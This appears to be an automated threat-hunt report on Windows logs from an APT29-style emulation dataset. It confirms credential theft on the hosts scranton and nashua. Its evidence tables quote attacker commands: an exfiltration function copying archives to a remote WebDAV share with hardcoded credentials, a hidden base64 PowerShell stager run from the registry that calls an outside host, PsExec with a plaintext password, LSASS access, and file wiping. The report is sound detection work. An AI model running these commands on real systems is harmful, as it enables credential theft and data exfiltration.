# Threat hunt report — 20261017-120051-converged-fix1

**Hypothesis:** An adversary who compromised Windows hosts in this network stole credentials from them (MITRE ATT&CK tactic: Credential Access).

**Verdict: Confirmed** — 10 in-scope incident(s) of verified malicious findings (confidence >= medium): I01 T1003 (F02, F63), I02 T1003.001 (F01, F14, F31, F36, F59, F64), I04 T1056.002 (F11), I05 T1110 (F15), I07 T1552 (F30, F62), I08 T1552.001 (F26, F61), I09 T1552.004 (F25, F60), I10 T1555 (F65, F66, F67), I11 T1556 (F35), I14 T1649 (F56)

Verdict method: rules over verified evidence (Confirmed if >=1 in-scope incident of verified malicious findings (confidence >= medium); Inconclusive if only suspicious incidents or coverage gaps; Refuted if full coverage and no malicious/suspicious finding)

| Run | Value |
|---|---|
| Profile | converged (thinking=False, temperature=0.0) |
| Model | deepseek-flash |
| Started / finished (UTC) | 2026-10-17T04:00:51+00:00 / 2026-10-17T04:11:40+00:00 (649.3 s) |
| LLM calls / tokens | 180 / {'prompt': 4661701, 'completion': 142780} |
| MCP tool calls | 1262 (server tools: list_data_sources, get_fields, search, count, aggregate, timeline, esql, get_event, get_registry) |
| ATT&CK tactics | credential-access — An adversary with existing access to Windows hosts on this network harvested credentials from those hosts. |

## Data examined

| Dataset | Events | First event (UTC) | Last event (UTC) | Hosts / observers | Sources (channel → template) |
|---|---|---|---|---|---|
| windows.other | 216 | 2020-05-02 02:56:47.000Z | 2020-05-02 03:23:08.000Z | scranton.dmevals.local, newyork.dmevals.local, nashua.dmevals.local, utica.dmevals.local | apt29-windows-other (push → windows-other) |
| windows.powershell | 10979 | 2020-05-02 02:56:14.000Z | 2020-05-02 03:21:30.000Z | scranton.dmevals.local, newyork.dmevals.local, nashua.dmevals.local | apt29-powershell (stream → windows-powershell) |
| windows.security | 41002 | 2020-05-02 02:55:25.000Z | 2020-05-02 03:28:09.000Z | scranton.dmevals.local, newyork.dmevals.local, nashua.dmevals.local, utica.dmevals.local | apt29-security (push → windows-security) |
| windows.sysmon | 143884 | 2020-05-02 02:55:23.551Z | 2020-05-02 03:28:17.683Z | scranton.dmevals.local, nashua.dmevals.local, newyork.dmevals.local, utica.dmevals.local | apt29-sysmon (pull → windows-sysmon) |
| zeek | 2140 | 2020-04-30 00:06:38.899Z | 2020-04-30 00:45:00.760Z | bobs.bigwheel.local, simplerockbuild.simplerock.lan | zeek-nashua (pull → zeek); zeek-scranton (pull → zeek) |

> Time windows: windows.other [2020-05-02T02:56:47.000Z .. 2020-05-02T03:23:08.000Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap. Events of these datasets were not correlated by time.

> Time windows: windows.powershell [2020-05-02T02:56:14.000Z .. 2020-05-02T03:21:30.000Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap. Events of these datasets were not correlated by time.

> Time windows: windows.security [2020-05-02T02:55:25.000Z .. 2020-05-02T03:28:09.000Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap. Events of these datasets were not correlated by time.

> Time windows: windows.sysmon [2020-05-02T02:55:23.551Z .. 2020-05-02T03:28:17.683Z] and zeek [2020-04-30T00:06:38.899Z .. 2020-04-30T00:45:00.760Z] do not overlap. Events of these datasets were not correlated by time.

The whole stored time range of every dataset was searched (planned checks carry no time filter).

## Incidents

Verified malicious/suspicious findings grouped by attacker action, each with the single best-fitting technique (consolidation step). In-scope incidents decide the verdict.

| Incident | Technique | In scope | Assessment | Findings | Title |
|---|---|---|---|---|---|
| I01 | T1003 | yes | malicious/high | F02, F63 | Credential-access toolchain staged and executed from user-writable paths (SysinternalsSuite, psversion.ps1, accesschk, sdelete, PsExec) |
| I02 | T1003.001 | yes | malicious/high | F01, F14, F31, F36, F59, F64 | LSASS memory access with full-access masks by attacker PowerShell on scranton and wsmprovhost on nashua |
| I03 | T1003.004 | yes | suspicious/medium | F03 | LSA registry key read by pbeesly's processes on scranton |
| I04 | T1056.002 | yes | malicious/high | F11 | PowerShell screen capture and clipboard harvesting on scranton |
| I05 | T1110 | yes | malicious/medium | F15 | No brute-force authentication attempts observed |
| I06 | T1110.002 | yes | suspicious/medium | F17 | No password-cracking tooling or hash files found |
| I07 | T1552 | yes | malicious/high | F30, F62 | Hardcoded plaintext credentials in attacker tooling on scranton |
| I08 | T1552.001 | yes | malicious/high | F26, F61 | Credential-bearing files staged and archived on scranton and nashua |
| I09 | T1552.004 | yes | malicious/high | F25, F60 | Private key and certificate export to password-protected .pfx on scranton |
| I10 | T1555 | yes | malicious/medium | F65, F66, F67 | PowerShell opens LSASS with full access on scranton and nashua (credential store access) |
| I11 | T1556 | yes | malicious/high | F35 | Credential theft and lateral movement by pbeesly; no authentication-process modification |
| I12 | T1556.007 | yes | suspicious/medium | F40 | No hybrid-identity backdoor; service installs are PsExec/Java |
| I13 | T1606.001 | yes | suspicious/medium | F54 | No web cookie theft/forging; malicious .scr execution and PsExec with plaintext password |
| I14 | T1649 | yes | malicious/high | F56 | Persistent RSA machine key exported and written to .pfx on scranton |
| I15 | out-of-scope:T1547 | no | malicious/high | F22 | hostui.exe persistence and registry-stored base64 PowerShell stager on scranton |

## Findings

### F02 · malicious / high · T1003 · Credential-access tooling staged by pbeesly on scranton (SysinternalsSuite, psversion.ps1, AV discovery, exfil)

Evidence status: **verified**

The scranton.dmevals.local host shows a full attacker toolchain under user pbeesly: SysinternalsSuite.zip downloaded to C:\Users\pbeesly\Downloads at 2020-05-02T02:59:42Z and unpacked by PowerShell, a script at C:\Program Files\SysinternalsSuite\psversion.ps1 defining Keystroke-Check (AV process enumeration) and Invoke-Exfil (7-Zip of the Downloads folder to OfficeSupplies.7z, then copy to \\192.168.0.4\webdav with hardcoded creds cozy/MyCozyPassw0rd!), and remote process/user enumeration on NASHUA via Invoke-Command. Combined with the LSASS full-access handle, this is credential theft activity on the host rather than administrative tooling.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHo31uOFchItz5hds0 | q-641c9b14b3 | ok |
| 2 | 2020-05-02 03:06:47.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Keystroke-Check {     Get-Process \| Where-Object { $_.ProcessName -Eq "avp" -or $_.ProcessName -Eq "acs" -or $_.ProcessName -Eq "outpost" -or $_.Proce… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwAjYpu | q-b3a5424840 | ok |
| 3 | 2020-05-02 03:09:23.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Invoke-Command -ComputerName NASHUA -ScriptBlock { Get-Process -IncludeUserName \| Select-Object UserName,SessionId \| Where-Object { $_.UserName -like "*\$env:… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwBj58r | q-b3a5424840 | ok |
| 4 | 2020-05-02 03:00:25.923Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\Downloads\SysinternalsSuite | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpMctHN | q-e8162d103d | ok |
| 5 | 2020-05-02 02:55:56.000Z | scranton.dmevals.local | windows.security | win.ProcessName | C:\ProgramData\victim\â€®cod.3aka3.scr | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwxYBM3 | q-e7c1d57f4c | ok |

### F63 · malicious / high · T1003 · Credential-access tooling staged and executed from user-writable paths on scranton and nashua

Evidence status: **verified**

pbeesly's PowerShell downloaded and unpacked SysinternalsSuite into C:\Users\pbeesly\Downloads (02:59:42–03:00:27), then ran accessChk.exe (03:04:34), sdelete64.exe against the malicious .scr, Draft.Zip and SysinternalsSuite.zip (03:02:04–03:03:33) and PsExec64.exe to nashua. On nashua, python.exe was dropped into C:\Windows\Temp and executed by PSEXESVC.exe (03:11:40–03:15:03), spawning powershell.exe, Rar.exe and sdelete64.exe from C:\Windows\Temp — tooling staged outside the Windows directory and later wiped.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:59:42.544Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\Downloads\SysinternalsSuite.zip | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpVlTKv | q-bc09c204de | ok |
| 2 | 2020-05-02 03:04:34.951Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\accesschk.exe" | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCRb2o | q-c8a02c6c52 | ok |
| 3 | 2020-05-02 03:02:04.324Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\programdata\victim\???cod.3aka3.scr | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpHV4S3 | q-c8a02c6c52 | ok |
| 4 | 2020-05-02 03:11:40.213Z | nashua.dmevals.local | windows.sysmon | process.executable | C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItku2b9g | q-3c10d0cd64 | ok |
| 5 | 2020-05-02 03:11:40.213Z | nashua.dmevals.local | windows.sysmon | process.parent.executable | C:\Windows\PSEXESVC.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItku2b9g | q-3c10d0cd64 | ok |
| 6 | 2020-05-02 03:16:52.456Z | nashua.dmevals.local | windows.sysmon | process.command_line | .\sdelete64.exe  /accepteula "C:\Windows\Temp\Rar.exe" | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkjomHY | q-3c10d0cd64 | ok |

### F01 · malicious / high · T1003.001 · pbeesly's PowerShell opened LSASS with full-access (0x1FFFFF) and 0x1F3FFF masks on scranton

Evidence status: **verified**

On scranton.dmevals.local at 2020-05-02T03:05:16Z, PowerShell.exe (PID 2976) running as user pbeesly (S-1-5-21-1830255721-3727074217-2423397540-1107, logon 0x372e81) requested a handle to C:\windows\system32\lsass.exe with GrantedAccess 0x1f3fff and then 0x1fffff — PROCESS_ALL_ACCESS including read/write of process memory, the classic LSASS memory-dump access mask. Sysmon call trace shows an UNKNOWN module frame (UNKNOWN(000001996D28200D)) rather than a signed system DLL, indicating injected/reflective code. The same user's PowerShell session had earlier downloaded and unpacked SysinternalsSuite into C:\Users\pbeesly\Downloads and ran a script from C:\Program Files\SysinternalsSuite\psversion.ps1 containing AV-discovery (Keystroke-Check) and exfiltration (Invoke-Exfil) functions, and at 03:09:23Z used Invoke-Command against NASHUA. This is attacker credential dumping from LSASS memory, not normal system behaviour.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3J | q-936068e9e5 | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9c584\|C:\windows\System32\KERNELBASE.dll+2732e\|UNKNOWN(000001996D28200D) | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3J | q-f4f42f8ed7 | ok |
| 3 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3G | q-936068e9e5 | ok |
| 4 | 2020-05-02 03:05:16.000Z | scranton.dmevals.local | windows.security | win.AccessMask | 0x1fffff | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwqOo57 | q-9351daaef3 | ok |
| 5 | 2020-05-02 03:05:16.000Z | scranton.dmevals.local | windows.security | win.SubjectUserName | pbeesly | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwqOo57 | q-9351daaef3 | ok |
| 6 | 2020-05-02 03:05:16.000Z | scranton.dmevals.local | windows.security | win.ObjectName | \Device\HarddiskVolume2\Windows\System32\lsass.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwqOo54 | q-3d8dcefc55 | ok |
| 7 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.Path | C:\Program Files\SysinternalsSuite\psversion.ps1 | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHo31uOFchItz5hds0 | q-641c9b14b3 | ok |
| 8 | 2020-05-02 02:59:42.544Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\Downloads\SysinternalsSuite.zip | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpVlTKv | q-e8162d103d | ok |

### F59 · malicious / high · T1003.001 · PowerShell in-memory C# compilation (csc.exe) on scranton — LSASS opened with 0x1F3FFF/0x1FFFFF from PowerShell

Evidence status: **verified**

On scranton.dmevals.local, user pbeesly's PowerShell wrote a C# source tree to C:\Users\pbeesly\AppData\Local\Temp\qkbkqqbs (02:58:45) and compiled it with csc.exe /noconfig /fullpaths @qkbkqqbs.cmdline, producing qkbkqqbs.dll; a second identical compile ran at 03:08:03 in Temp\0piklvia producing 0piklvia.dll. Minutes later (03:05:16) PowerShell.exe opened lsass.exe with GrantedAccess 0x1f3fff and then 0x1fffff with an UNKNOWN call-trace frame (reflective/in-memory code), i.e. LSASS memory read for credential extraction. On nashua.dmevals.local the same pattern appears from wsmprovhost.exe (WinRM) opening lsass.exe with 0x1f3fff at 03:09:29.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:58:45.297Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\pbeesly\AppData\Local\Temp\qkbkqqbs\qkbkqqbs.cmdline" | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpfwJ_Y | q-c8a02c6c52 | ok |
| 2 | 2020-05-02 02:58:45.621Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\AppData\Local\Temp\qkbkqqbs\qkbkqqbs.dll | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpfwJ-Y | q-74ab938d1f | ok |
| 3 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3G | q-65829f2382 | ok |
| 4 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3J | q-65829f2382 | ok |
| 5 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9c584\|C:\windows\System32\KERNELBASE.dll+2732e\|UNKNOWN(000001996D28200D) | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3J | q-65829f2382 | ok |
| 6 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\wsmprovhost.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkw4a_B | q-247b95f06f | ok |
| 7 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkw4a_B | q-247b95f06f | ok |

### F11 · malicious / high · T1056.002 · PowerShell screen-capture and clipboard harvesting on scranton.dmevals.local by user pbeesly

Evidence status: **verified**

On 2020-05-02 between 03:05:53Z and 03:07:54Z, PowerShell (PID 3852, user pbeesly, host scranton.dmevals.local) defined and ran a function Invoke-ScreenCapture that loops every 300 seconds taking full virtual-screen screenshots via System.Windows.Forms/System.Drawing CopyFromScreen and saving them as randomly named .bmp files in $env:USERPROFILE\Downloads. The script block was logged with Path C:\Program Files\SysinternalsSuite\psversion.ps1. In the same session the operator ran Get-Clipboard (03:06:42Z) to harvest clipboard contents, then removed the background job with Remove-Job -Name "Screenshot" -Force (03:07:54Z). Capturing the GUI and clipboard is GUI input capture used to collect on-screen credentials/data; the use of a Sysinternals-suite path as a script host and the immediate cleanup of the job indicate deliberate, hands-on-keyboard collection rather than administration.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:53.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-ScreenCapture # https://www.pdq.com/blog/capturing-screenshots-with-powershell-and-net/ {     Start-Job -Name "Screenshot" -ScriptBlock {       … | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwAjYrA | q-c37e97e3f1 | ok |
| 2 | 2020-05-02 03:05:53.000Z | scranton.dmevals.local | windows.powershell | win.Path | C:\Program Files\SysinternalsSuite\psversion.ps1 | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwAjYrA | q-c37e97e3f1 | ok |
| 3 | 2020-05-02 03:05:59.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText |           Write-Host "`nJobPID`n------`n$PID"         while($true){             $RandomFileName = [System.IO.Path]::GetRandomFileName();              $Filepath=… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwAjoor | q-858a69835c | ok |
| 4 | 2020-05-02 03:06:42.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Get-Clipboard | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwAjopc | q-619323aa60 | ok |
| 5 | 2020-05-02 03:07:54.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Remove-Job -Name "Screenshot" -Force | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHo31uOFchItz_h1K2 | q-efdee1ceab | ok |

### F15 · malicious / medium · T1110 · No brute-force authentication attempts observed; credential theft instead (LSASS access by hidden PowerShell on scranton)

Evidence status: **verified**

No failed-logon (4625) or Kerberos pre-auth failure (4771) events exist anywhere in windows.security, and no authentication-attempt tooling was found, so brute force itself is not observed. However, the same window contains credential-access activity: on scranton.dmevals.local a hidden, execution-policy-bypassing PowerShell (PID 2976, user DMEVALS\pbeesly, High integrity, parent C:\Windows\System32\control.exe /name Microsoft.BackupAndRestoreCenter) that decodes a payload from C:\Users\pbeesly\Downloads\monkey.png via IEX opened lsass.exe with GrantedAccess 0x1fffff and 0x1f3fff at 03:05:16, i.e. full-process access consistent with credential dumping rather than brute force. The same actor then used the recovered plaintext password for dmevals\pbeesly (Fl0nk3rt0n!T0by) in PsExec64 to \\NASHUA, spawning C:\Windows\Temp\python.exe via PSEXESVC.exe. This is credential theft/reuse, not password guessing, spraying or stuffing.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3J | q-bf0bf74605 | ok |
| 2 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.SourceImage | C:\windows\system32\WindowsPowerShell\v1.0\PowerShell.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3J | q-bf0bf74605 | ok |
| 3 | 2020-05-02 02:58:44.325Z | scranton.dmevals.local | windows.sysmon | process.command_line | "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbee… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpgwo_a | q-415bf61ca0 | ok |
| 4 | 2020-05-02 03:11:18.784Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItku2r93 | q-56ac5587de | ok |

### F22 · malicious / high · T1187 · Related implant on scranton: hostui.exe persistence + registry-stored base64 PowerShell stager

Evidence status: **verified**

While hunting T1187 on scranton.dmevals.local I found a separate, clearly malicious chain (not forced authentication): PowerShell (PID 3876, SYSTEM) created C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\hostui.lnk at 03:04:23Z and set HKLM\SOFTWARE\Javasoft\value Supplement to a base64-encoded 'powershell.exe -nop -w hidden -e ...' command. At 03:21:19Z user pbeesly's explorer.exe launched C:\Windows\System32\hostui.bat, which ran powershell.exe -c "Start-Process C:\Windows\System32\hostui.exe -verb runas"; hostui.exe then spawned powershell.exe -c "Get-ItemPropertyValue 'HKLM:\\SOFTWARE\Javasoft' 'value Supplement' \| Invoke-Expression", which connected outbound to 192.168.0.4:443. This is a persistence + stager implant, not T1187 forced authentication, so it is reported here as context only.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:23.572Z | scranton.dmevals.local | windows.sysmon | win.TargetObject | HKLM\SOFTWARE\Javasoft\value Supplement | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpEStoK | q-ecd6ad300b | ok |
| 2 | 2020-05-02 03:04:23.572Z | scranton.dmevals.local | windows.sysmon | win.Details | powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQ… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpEStoK | q-4a1123da1f | ok |
| 3 | 2020-05-02 03:21:19.014Z | scranton.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\cmd.exe /c ""C:\Windows\System32\hostui.bat" " | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHoX1uOFchItn-BEDj | q-07e94327a9 | ok |
| 4 | 2020-05-02 03:21:19.323Z | scranton.dmevals.local | windows.sysmon | process.command_line | powershell.exe  -c "Start-Process C:\Windows\System32\hostui.exe -verb runas" | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHoX1uOFchItj59cFt | q-07e94327a9 | ok |
| 5 | 2020-05-02 03:21:27.859Z | scranton.dmevals.local | windows.sysmon | process.command_line | powershell.exe -c "Get-ItemPropertyValue 'HKLM:\\SOFTWARE\Javasoft' 'value Supplement' \| Invoke-Expression" | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkHK8X3 | q-6a585b042b | ok |
| 6 | 2020-05-02 03:21:30.387Z | scranton.dmevals.local | windows.sysmon | destination.ip | 192.168.0.4 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHoX1uOFchItj59cEe | q-2c40ab97b1 | ok |

### F30 · malicious / high · T1552 · Unsecured credentials: hardcoded plaintext passwords used in attacker tooling on scranton

Evidence status: **verified**

Beyond the certificate export, the pbeesly session on scranton.dmevals.local embedded plaintext credentials in tooling: the Get-PrivateKeys function hardcoded the .pfx password "saribas", and PsExec64.exe was launched four times (03:11:18Z to 03:14:42Z) against \\NASHUA with the cleartext password Fl0nk3rt0n!T0by on the command line. The session also ran discovery (Invoke-Discovery enumerating AV/firewall WMI and local groups), sdelete64.exe wiping of C:\programdata\victim\???cod.3aka3.scr, Draft.Zip, SysinternalsSuite.zip and the nashua archives, and a hidden encoded PowerShell command at 03:21:28Z — a coherent hands-on-keyboard intrusion rather than admin maintenance.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:18.784Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItku2r93 | q-fc079ebe18 | ok |
| 2 | 2020-05-02 03:02:04.324Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\sdelete64.exe" /accepteula C:\programdata\victim\???cod.3aka3.scr | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpHV4S3 | q-fc079ebe18 | ok |
| 3 | 2020-05-02 03:04:03.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Discovery {     $DiscoveryInfo =@()     $CurrentDir = Get-Location      $DiscoveryInfo += [PSCustomObject]@{                 CurrentDirectory = … | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwCkSwG | q-7e883c115b | ok |
| 4 | 2020-05-02 03:21:28.949Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbg… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkHK8V2 | q-a5cf1a36c0 | ok |

### F62 · malicious / high · T1552 · Hardcoded plaintext credentials in attacker tooling on scranton (cozy/MyCozyPassw0rd!, dmevals\pbeesly Fl0nk3rt0n!T0by)

Evidence status: **verified**

The Invoke-Exfil scriptblock on scranton (from C:\Program Files\SysinternalsSuite\psversion.ps1) embeds the plaintext credential cozy / MyCozyPassw0rd! to map \\192.168.0.4\webdav for exfiltration. pbeesly's PowerShell also launched PsExec64.exe four times (03:11:18–03:14:42) against \\NASHUA with the plaintext password Fl0nk3rt0n!T0by for dmevals\pbeesly, running C:\Windows\Temp\python.exe remotely.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | message | Creating Scriptblock text (1 of 1):  function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHo31uOFchItz5hds0 | q-0d63ac5c98 | ok |
| 2 | 2020-05-02 03:11:18.784Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItku2r93 | q-c8a02c6c52 | ok |

### F61 · malicious / high · T1552.001 · Credential-bearing files collected and archived: passwordsDB, Draft.Zip, OfficeSupplies.7z (scranton) and working.zip (nashua)

Evidence status: **verified**

On scranton, accesschk.exe (run by pbeesly's PowerShell at 03:04:34) wrote C:\Program Files\SysinternalsSuite\passwordsDB at 03:04:35; PowerShell created C:\Users\pbeesly\AppData\Roaming\Draft.Zip at 02:56:18 and the password-protected archive C:\Users\pbeesly\AppData\Roaming\OfficeSupplies.7z at 03:08:35 (Invoke-Exfil compresses the Downloads folder with -Password "lolol"). On nashua, PowerShell created C:\Users\pbeesly\AppData\Roaming\working.zip at 03:16:00 and Rar.exe archived it to C:\Users\pbeesly\Desktop\working.zip with -hpfGzq5yKw at 03:16:19, after which sdelete64 wiped Rar.exe and both zips.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:35.069Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Program Files\SysinternalsSuite\passwordsDB | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCRb2e | q-c9547c13c4 | ok |
| 2 | 2020-05-02 03:04:35.069Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\Program Files\SysinternalsSuite\accesschk.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCRb2e | q-c9547c13c4 | ok |
| 3 | 2020-05-02 02:56:18.032Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\AppData\Roaming\Draft.Zip | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpjzkPd | q-c9547c13c4 | ok |
